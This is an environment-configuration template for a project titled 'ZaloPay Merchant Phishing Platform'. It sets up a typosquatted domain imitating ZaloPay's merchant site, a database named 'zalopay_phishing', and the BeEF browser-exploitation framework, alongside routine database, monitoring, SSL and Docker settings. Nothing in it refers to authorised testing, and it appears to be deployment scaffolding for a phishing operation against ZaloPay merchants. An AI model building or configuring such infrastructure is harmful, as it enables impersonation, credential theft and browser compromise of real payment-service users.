# ZaloPay Merchant Phishing Platform - Environment Configuration
# Copy this file to .env and update with your actual values

# ========================================
# DOMAIN CONFIGURATION
# ========================================
# Primary domain for the application
DOMAIN=zalopaymerchan.com

# ========================================
# DATABASE CONFIGURATION
# ========================================
# MongoDB Configuration
MONGODB_ROOT_USERNAME=admin
MONGODB_ROOT_PASSWORD=CHANGE_THIS_SECURE_PASSWORD
MONGODB_DATABASE=zalopay_phishing

# Redis Configuration
REDIS_PASSWORD=CHANGE_THIS_SECURE_REDIS_PASSWORD

# ========================================
# SECURITY CONFIGURATION
# ========================================
# JWT Configuration
JWT_SECRET_KEY=CHANGE_THIS_JWT_SECRET_KEY_TO_SOMETHING_SECURE

# Encryption Key (32+ characters recommended)
ENCRYPTION_KEY=CHANGE_THIS_ENCRYPTION_KEY_TO_SOMETHING_SECURE

# ========================================
# BEEF FRAMEWORK CONFIGURATION
# ========================================
BEEF_USER=beef
BEEF_PASSWORD=CHANGE_THIS_BEEF_PASSWORD

# ========================================
# MONITORING CONFIGURATION
# ========================================
# Elasticsearch Configuration (for Filebeat output)
ELASTICSEARCH_USERNAME=elastic
ELASTICSEARCH_PASSWORD=CHANGE_THIS_ELASTIC_PASSWORD

# Alert Configuration
ALERT_EMAIL=admin@zalopaymerchan.com

# Slack Webhook for notifications (optional)
SLACK_WEBHOOK=https://hooks.slack.com/services/YOUR/SLACK/WEBHOOK

# ========================================
# BACKUP CONFIGURATION
# ========================================
# Backup retention period in days
RETENTION_DAYS=30

# Backup compression level (1-9)
COMPRESS_LEVEL=6

# ========================================
# MONITORING CONFIGURATION
# ========================================
# Health check interval in seconds
CHECK_INTERVAL=60

# ========================================
# DEVELOPMENT SETTINGS
# ========================================
# Set to True for development, False for production
DEBUG=False

# Log level (DEBUG, INFO, WARNING, ERROR)
LOG_LEVEL=INFO

# ========================================
# PERFORMANCE SETTINGS
# ========================================
# Number of worker processes
WORKERS=4

# Maximum memory usage for Redis (MB)
REDIS_MAXMEMORY=512

# ========================================
# SSL CONFIGURATION
# ========================================
# Email for SSL certificate registration
SSL_EMAIL=admin@zalopaymerchan.com

# ========================================
# SECURITY SETTINGS
# ========================================
# Enable security headers
SECURITY_HEADERS=True

# Enable rate limiting
RATE_LIMITING=True

# Maximum login attempts per minute
MAX_LOGIN_ATTEMPTS=5

# ========================================
# NETWORK CONFIGURATION
# ========================================
# External port for HTTP (default: 80)
HTTP_PORT=80

# External port for HTTPS (default: 443)
HTTPS_PORT=443

# Internal port for backend API (default: 8000)
BACKEND_PORT=8000

# Internal port for BeEF (default: 3000)
BEEF_PORT=3000

# ========================================
# DOCKER SETTINGS
# ========================================
# Docker Compose project name
COMPOSE_PROJECT_NAME=zalopay

# Timezone for containers
TZ=UTC

# ========================================
# IMPORTANT SECURITY NOTES
# ========================================
# 1. Never commit .env file to version control
# 2. Use strong, unique passwords for all services
# 3. Regularly rotate encryption keys and passwords
# 4. Monitor logs for suspicious activity
# 5. Keep all software updated
# 6. Use firewall to restrict access
# 7. Enable SSL/TLS encryption
# 8. Use secrets management for production